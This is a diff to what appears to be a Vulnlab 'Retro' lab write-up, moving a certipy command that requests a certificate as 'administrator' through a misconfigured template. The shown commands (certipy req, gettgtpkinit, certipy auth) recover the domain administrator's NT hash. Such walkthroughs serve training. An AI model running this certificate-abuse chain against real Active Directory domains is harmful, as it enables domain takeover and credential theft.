@@ -300,11 +300,25 @@ INFO: Done in 00M 04S
 
 Then I can query the user `BANKING$` and I can see its `First Degree Group Membership` that this user is part of the group `DOMAIN COMPUTERS`, so we can use that user to exploit the certificate and retrieve the NTLM hash of the administrator.
 
+Lets retrieve the private key:
+
+```
+syl@sylsec:~/vulnlab/Retro$ certipy req -u 'BANKING$' -p 'Summer2018!' -dc-ip '10.10.64.243' -target 'dc.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator' -key-size 4096
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 13
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
 # UnPAC the hash Method #1
 
 We can use the technique UnPAC the hash to get the NTLM hash using the <a target="_blank" href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a>.
 
-First we need to retrieve the TGT and the AS-REP encryption key
+First we need to retrieve the TGT and the AS-REP encryption key.
 
 ```
 syl@sylsec:~/vulnlab/Retro/temp$ gettgtpkinit -cert-pfx ../exfiltrated/administrator.pfx -dc-ip 10.10.113.62 retro.vl/administrator ../exfiltrated/administrator.ccache 
@@ -335,16 +349,6 @@ Recovered NT Hash
 # Using Certipy Method #2
 
 ```
-syl@sylsec:~/vulnlab/Retro$ certipy req -u 'BANKING$' -p 'Summer2018!' -dc-ip '10.10.64.243' -target 'dc.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator' -key-size 4096
-Certipy v4.8.2 - by Oliver Lyak (ly4k)
-
-[*] Requesting certificate via RPC
-[*] Successfully requested certificate
-[*] Request ID is 13
-[*] Got certificate with UPN 'administrator'
-[*] Certificate has no object SID
-[*] Saved certificate and private key to 'administrator.pfx'
-
 syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip '10.10.64.243' -username 'administrator' -domain retro.vl
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
